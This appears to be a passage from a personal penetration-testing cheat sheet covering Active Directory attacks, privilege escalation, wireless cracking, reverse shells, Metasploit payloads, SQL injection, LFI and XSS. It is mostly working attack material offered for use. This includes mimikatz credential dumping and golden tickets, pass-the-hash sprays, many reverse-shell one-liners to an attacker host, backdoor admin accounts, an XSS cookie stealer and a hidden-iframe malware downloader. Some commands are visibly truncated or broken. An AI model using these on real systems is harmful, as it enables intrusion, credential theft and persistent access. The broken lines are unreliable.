    Get-UserProperty -Properties pwdlastset/logoncount/badpwdcount
    Get-NetComputer -FullData(extra data) | select(like grep) OperatingSystem
    Get-NetGroupMember -GroupName "Domain Admins"
    Invoke-ShareFinder
    Get-NetGPO | select displayname, whenchanged

    ```

- [bloodhound](https://github.com/BloodHoundAD/BloodHound) - easily identify highly complex attack paths
- crackmapexec - can take passwords or hashes that we found and check them against all computers on a network

    ```powershell
    crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
    #Spray the network with local login credentials then dump SAM contents
    crackmapexec smb 10.0.0.1/24 -u administrator -p 'password' --local-auth --sam
    #Pass the hash network-wide, local login, dump LSA contents
    crackmapexec smb 10.0.0.1/24 -u administrator -H <hash> --local-auth --lsa

    ```

- [secretsdump.py](http://secretsdump.py) (impacket) - dumps hashes for known user/password

    ```powershell
    secretsdump.py marvel/fcastle:Pssword1@192.168.4.4
    ```

- [incognito (meterpeter)](https://www.notion.so/incognito-meterpeter-881379ef297d4b3f8b50745428e1e8ed) - can impersonate a user
- [GetUserSPNs.py](http://getuserspns.py) (impacket)

    ```bash
    GetUserSpns.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
    ```

- [mimikatz](https://github.com/gentilkiwi/mimikatz) - can extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets

    ```bash
    mimikatz
    privilege::debug` (allow us to bypass several protections)
    sekurlsa::logonpasswords` show us all users login from reboot, we can pass the hash or crack them, we can search for `wdigest` until windows8 including windows7 the passoword stored in plain text, from windows8 microsoft turned it off, we can turn it on from mimikatz and wait for a user to login
    lsadump::sam` dumps the SAM
    lsadump::lsa /patch` dumps Local Security Authority
    lsadump::lsa /inject /name:krbtgt`
    kerberos::golden /User:Administrator(doesnt matter, can be fake) /domain:marvel.local /sid:SID /krbtgt:NTLM /id:500(your RID) /ptt(pass the ticket to our next session)`
    misc::command` (gives us command prompt with full privilege)
    ```

# Privilige Escalation ([alot of resources](https://github.com/coreb1t/awesome-pentest-cheat-sheets#privilege-escalation))

[Linux privilege escalation](https://jok3rsecurity.wordpress.com/linux-privilege-escalation/)

[Linux Privilege Escalation CheatSheet for OSCP - ByteFellow](https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/)

[windows privilege escalation](https://jok3rsecurity.wordpress.com/windows-privilege-escalation/)

[Windows Privilege Escalation Cheatsheet for OSCP - ByteFellow](https://www.bytefellow.com/windows-privilege-escalation-cheatsheet-for-oscp/)

[C0nd4/OSCP-Priv-Esc](https://github.com/C0nd4/OSCP-Priv-Esc)

## **Linux:**

Find Binaries that will execute as the owner

```bash
find / -perm -u=s -type f 2>/dev/null
```

Find binaries that will execute as the group

```bash
find / -perm -g=s -type f 2>/dev/null
```

Find sticky-bit binaries

```bash
find / -perm -1000 -type d 2>/dev/null
```

If Python is executable as root

```bash
python2.7 -c "import pty;pty.spawn('/bin/sh');"
```

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux Privilege Escalation Awesome Script

```bash
#From github
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

#Local network
sudo python -m SimpleHTTPServer 80
curl 10.10.10.10/linpeas.sh | sh

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh
cat < /dev/tcp/10.10.10.10/80 | sh

#Output to file
linpeas -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt #Read with colors
```

- [LinEnum](https://github.com/rebootuser/LinEnum)

```bash
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    #-k Enter keyword
    #-e Enter export location
    #-t Include thorough (lengthy) tests
    #-s Supply current user password to check sudo perms (INSECURE)
    #-r Enter report name
    #-h Displays this help text
```

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

## **Windows:**

```powershell
#after getting a low privilege shell
systeminfo
#copy the result to systeminfo.txt
python2 ~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
python2 ~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --systeminfo systeminfo.txt --database [DB].xls
```

[https://github.com/pentestmonkey/windows-prive](https://github.com/pentestmonkey/windows-privesc-check)

[sc-check](https://github.com/pentestmonkey/windows-privesc-check)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

# Maintain Access

- metasploit

    ```bash
    persistence -h
    OR
    exploit/windows/local/persistence
    OR
    net user hacker password123 /add
    ```

# Wireless Penetration

- airmon-ng, airodump-ng, aircrack-ng - crack wifi networks

    ```bash
    iwconfig #show wireless cards, check after connecting the wireless card to the vm machine in options
    airmon-ng check kill #will kill process that intruppt
    airmon-ng start wlan0 #starts monitor mode on the card
    iwconfig #will assure that we are in monitor mode
    airodump-ng wlan0mon #check for avaliable networks, PWR show the closer network, the smallest number is the closest
    airodump-ng -c 6 --bssid MAC -w capture wlan0mon #will capture data from the specific MAC address of the network we want, 6 is the channel number of the network

    #we are waiting to capture the handshake, it will written in the header
    #we can make it faster by DEAUTH which means kicking a connected user and while he re-auth we will capture the handshake
    #in a new terminal:
    aireplay-ng -0 1 -a MAC_OF_THE_NETWORK -c MAC_OF_THE_STATION_CONNECTED wlan0mon
    ls capture*
    aircrack-ng -w wordlist.txt -b MAC_OF_THE_NETWORK CAPTUREFILE #could be done also with hashcat
    #phone numbers are very common as a password

    ```

# **Shells & Reverse Shells**

## **SUID C Shells**

- bin/bash:

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

- bin/sh:

```
int main(void){

setresuid(0, 0, 0);

system("/bin/sh");

}
```

### **TTY Shell:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")' #Python TTY Shell Trick
```

```bash
echo os.system('/bin/bash')
```

```bash
/bin/sh –i #Spawn Interactive sh shell
```

```bash
execute('/bin/sh')
```

- LUA

```bash
!sh
```

- Privilege Escalation via nmap

```bash
:!bash
```

- Privilege escalation via vi

### Fully Interactive TTY

```
                                In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
                                In Attacker console
stty -a
stty raw -echo
fg
                                In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### **Spawn Ruby Shell**

```bash
exec "/bin/sh"
```

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
```

### **Netcat**

```bash
nc -e /bin/sh ATTACKING-IP 80
```

```bash
/bin/sh | nc ATTACKING-IP 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

### **Telnet Reverse Shell**

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

### **PHP**

```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)

### **Bash**

```bash
exec /bin/bash 0&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash
# or: while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

### **Perl**

```bash
exec "/bin/sh";
```

```bash
perl —e 'exec "/bin/sh";'
```

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

- Windows

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- 

# Meterpreter (Metasploit) ([cheet sheet](https://www.tunnelsup.com/metasploit-cheat-sheet/))

### **Windows reverse meterpreter payload**

```bash
set payload windows/meterpreter/reverse_tcp
```

- Windows reverse tcp payload

### **Windows VNC Meterpreter payload**

```bash
set payload windows/vncinject/reverse_tcpf
```

- Meterpreter Windows VNC Payload

```bash
set ViewOnly false
```

### **Linux Reverse Meterpreter payload**

```bash
set payload linux/meterpreter/reverse_tcp
```

- Meterpreter Linux Reverse Payload

### **Meterpreter Cheat Sheet**

```bash
upload file c:\\windows
```

- Meterpreter upload file to Windows target

```bash
download c:\\windows\\repair\\sam /tmp
```

- Meterpreter download file from Windows target

```bash
download c:\\windows\\repair\\sam /tmp
```

- Meterpreter download file from Windows target

```bash
execute -f c:\\windows\temp\exploit.exe
```

- Meterpreter run .exe on target – handy for executing uploaded exploits

```bash
execute -f cmd -c
```

- Creates new channel with cmd shell

```bash
ps
```

- Meterpreter show processes

```bash
shell
```

- Meterpreter get shell on the target

```bash
getsystem
```

- Meterpreter attempts priviledge escalation the target

```bash
hashdump
```

- Meterpreter attempts to dump the hashes on the target (must have privileges; try migrating to winlogon.exe if possible first)

```bash
portfwd add –l 3389 –p 3389 –r target
```

- Meterpreter create port forward to target machine

```bash
portfwd delete –l 3389 –p 3389 –r target
```

- Meterpreter delete port forward

```bash
use exploit/windows/local/bypassuac
```

- Bypass UAC on Windows 7 + Set target + arch, x86/64

```bash
use auxiliary/scanner/http/dir_scanner
```

- Metasploit HTTP directory scanner

```bash
use auxiliary/scanner/http/jboss_vulnscan
```

- Metasploit JBOSS vulnerability scanner

```bash
use auxiliary/scanner/mssql/mssql_login
```

- Metasploit MSSQL Credential Scanner

```bash
use auxiliary/scanner/mysql/mysql_version
```

- Metasploit MSSQL Version Scanner

```bash
use auxiliary/scanner/oracle/oracle_login
```

- Metasploit Oracle Login Module

```bash
use exploit/multi/script/web_delivery
```

- Metasploit powershell payload delivery module

```bash
post/windows/manage/powershell/exec_powershell
```

- Metasploit upload and run powershell script through a session

```bash
use exploit/multi/http/jboss_maindeployer
```

- Metasploit JBOSS deploy

```bash
use exploit/windows/mssql/mssql_payload
```

- Metasploit MSSQL payload

```bash
run post/windows/gather/win_privs
```

- Metasploit show privileges of current user

```bash
use post/windows/gather/credentials/gpp
```

- Metasploit grab GPP saved passwords

```bash
load kiwi
```

```bash
creds_all
```

- Metasploit load Mimikatz/kiwi and get creds

```bash
run post/windows/gather/local_admin_search_enum
```

- Idenitfy other machines that the supplied domain user has administrative access to

```bash
set AUTORUNSCRIPT post/windows/manage/migrate
```

### **Meterpreter Payloads**

```bash
msfvenom –l
```

- List options

### **Binaries**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
```

### **Web Payloads**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php
```

- PHP

```bash
set payload php/meterpreter/reverse_tcp
```

- Listener

```bash
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

- PHP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

- ASP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

- JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

- WAR

### **Scripting Payloads**

```bash
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
```

- Python

```bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
```

- Bash

```bash
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

- Perl

### **Shellcode**

For all shellcode see ‘msfvenom –help-formats’ for information as to
valid parameters. Msfvenom will output code that is able to be cut and
pasted in this language for your exploits.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
```

### **Handlers**

Metasploit handlers can be great at quickly setting up Metasploit to
be in a position to receive your incoming shells. Handlers should be in
the following format.

```
exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z
```

An example is:

```
msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
```

# **Powershell**

**Execution Bypass**

```bash
Set-ExecutionPolicy Unrestricted
./file.ps1
```

```bash
Import-Module script.psm1
Invoke-FunctionThatIsIntheModule
```

```bash
iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)
```

**Powershell.exe blocked**

```bash
Use ‘not powershell’ [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)
```

**Persistence**

```bash
net user username "password" /ADD
```

```bash
net group "Domain Admins" %username% /DOMAIN /ADD
```

**Gather NTDS.dit file**

```bash
ntdsutil
```

```bash
activate instance ntds
```

```bash
ifm
```

```bash
create full C:\ntdsutil
```

```bash
quit
```

```bash
quit
```

# **SQLInjections**

### Common **Injections for Login Forms:**

```bash
admin' --
```

```bash
admin' #
```

```bash
admin'/*
```

```bash
' or 1=1--
```

```bash
' or 1=1#
```

```bash
' or 1=1/*
```

```bash
') or '1'='1--
```

```bash
') or ('1'='1—
```

## Uploading Files to Target Machine

TFTP

```bash
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

FTP

```bash
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
```

CertUtil (download file from windows)

```bash
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
me
```

PHP

```bash
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

Python

```bash
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

HTTP: Powershell

```bash
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

HTTP: Linux

```bash
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

NetCat

```bash
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

# Web Application

## LFI (Local File Inclusion)

if we found an LFI, we can check each of those paths,

we can use burpsuite intruder to see all
Useful LFI files
Linux
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/[0-9]*/fd/[0-9]*
/proc/mounts
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
Apache
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
Debian/Ubuntu -> /var/log/apache2/access.log
FreeBSD -> /var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
MySQL
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
Windows
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt

Situation

```
http://<target>/index.php?parameter=value

```

### How to Test

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index

```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd
OR
http://<target>/script.php?page=..//..//..//..//..//..//../etc/passwd
OR
curl http://<target>/script.php?page=..//..//..//..//..//..//../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini

```

### LFI Payloads

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

## XSS

### Reflected

### Simple test

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

<plaintext>

### Simple XSS test

<script>alert('Found')</script>

"><script>alert(Found)</script>">

<script>alert(String.fromCharCode(88,83,83))</script>

### Bypass filter of tag script

`" onload="alert(String.fromCharCode(88,83,83))`

" onload="alert('XSS')

bla is not a valid image, so this cause an error

<img src='bla' onerror=alert("XSS")>

### Persistent

>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";

### PHP collector

`> cookie.txtchmod 777 cookie.txt`

edit a php page like colector.php as follow:

<?php $cookie=GET['cookie']; $useragent=$_SERVER['HTTP_USER_AGENT']; $file=fopen('cookie.txt', 'a'); fwrite($file,"USER AGENT:$useragent || COOKIE=$cookie\n"); fclose($file);
?>

Script to put in page:

<scritp>new Image().src="http://OUR_SERVER_IP/colector.php?cookie="+document.cookie;</script>

### Malware Donwloader via XSS

<iframe src="http://OUR_SERVER_IP/OUR_MALWARE" height="0" width="0"></iframe>

### How to play Mario with XSS

<iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>

<input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>

### XSS payloads

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)

## MySql Cheat Sheet

```bash
mysql -u [username] -p; #connect, you will be asked for password
SHOW DATABASES;
use DB_NAME;
SHOW TABLES;
select * from TABLE;
```

[MySQL cheatsheet](https://devhints.io/mysql)

[MySQL Cheat Sheet](https://www.mysqltutorial.org/mysql-cheat-sheet.aspx)

# Misc

## Linux file permissions

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%202.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%202.png)

## Linux Cheat Sheet

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%203.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%203.png)

[](https://itblogr.com/wp-content/uploads/2020/04/The-Concise-Blue-Team-cheat-Sheets.pdf?fbclid=IwAR2lG6uxX3cMwu4G80Vwl_ZxpddwEPDqsyXb27yw5xjMOnAB1zX9ZEjDl78)

[Hacking Cheat Sheets](https://cheatography.com/tag/hacking/)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%204.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%204.png)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%205.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%205.png)

vi cheat sheet

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%206.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%206.png)

## find cheat sheet

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%207.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%207.png)

## Simple Local Web Servers

Python local web server command, handy for serving up shells and exploits on an attacking machine.

```bash
python -m SimpleHTTPServer 80
python3 -m http.server
python -m pyftpdlib -p 21 #start a local ftp server with anonymous:anonymouscer

updog

ruby -rwebrick -e "WEBrick::HTTPServer.new
(:Port => 80, :DocumentRoot => Dir.pwd).start"

php -S 0.0.0.0:80
```

## Hash Examples

Likely just use **hash-identifier** for this but here are some example hashes:

[Untitled](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%20Database%202c8912d8c7b747859491d93a41439662.csv)

# Text Manipulation

## [awk](https://www.howtogeek.com/562941/how-to-use-the-awk-command-on-linux/) - command-line text manipulation dynamo

```bash
awk -F: '{print $1,$6}' /etc/passwd
    $0: Represents the entire line of text.
    $1: Represents the first field.
    $2: Represents the second field.
    $7: Represents the seventh field.
    $45: Represents the 45th field.
    $NF: Stands for “number of fields,” and represents the last field.
    -F (separator string)
```

### Sublime Text Editor

```jsx
Splitting the Selection into Lines

Select a block of lines, and then split it into many selections, one per line, using:

    Windows/Linux: Ctrl+Shift+L
```

### sed cheat sheet

![https://s3.studylib.net/store/data/008266685_1-65c7d170c2600d5fd58feafc3611414f.png](https://s3.studylib.net/store/data/008266685_1-65c7d170c2600d5fd58feafc3611414f.png)

## Useful links

[A cheat-sheet for password crackers](https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers)

[Penetration testing and webapp cheat sheets](https://doxsec.wordpress.com/2017/07/21/penetration-testing-and-webapp-cheat-sheets/)

[The Ultimate List of SANS Cheat Sheets](https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/?utm_medium=Social&utm_source=Twitter&utm_content=EMEA&utm_campaign=Security%20Trends%20Blog)

[](https://www.sans.org/security-resources/posters/blueprint-building-pen-tester/160/download)

[](https://www.sans.org/security-resources/posters/pen-test-pivots-payloads/180/download)

[coreb1t/awesome-pentest-cheat-sheets](https://github.com/coreb1t/awesome-pentest-cheat-sheets)

[Penetrating Testing/Assessment Workflow](https://gist.github.com/jivoi/724e4b4b22501b77ef133edc63eba7b4)

[0DAYsecurity.com - The fastest resource to a proactive security](http://www.0daysecurity.com/pentest.html)

[OSCP Ultimate CheatSheet - ByteFellow](https://www.bytefellow.com/oscp-ultimate-cheatsheet/)

[Linux Privilege Escalation CheatSheet for OSCP - ByteFellow](https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/)

[Windows Privilege Escalation Cheatsheet for OSCP - ByteFellow](https://www.bytefellow.com/windows-privilege-escalation-cheatsheet-for-oscp/)

[Cheat Sheet](https://jok3rsecurity.com/cheat-sheet/)

[CountablyInfinite/oscp_cheatsheet](https://github.com/CountablyInfinite/oscp_cheatsheet)

[OSCP: Developing a Methodology](https://falconspy.medium.com/oscp-developing-a-methodology-32f4ab471fd6)

[Passing OSCP](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[](https://storage.googleapis.com/vkmedia-wp-blogg-vk/uploads/uploads/sites/710/2013/08/Linux-101-Hacks.pdf)
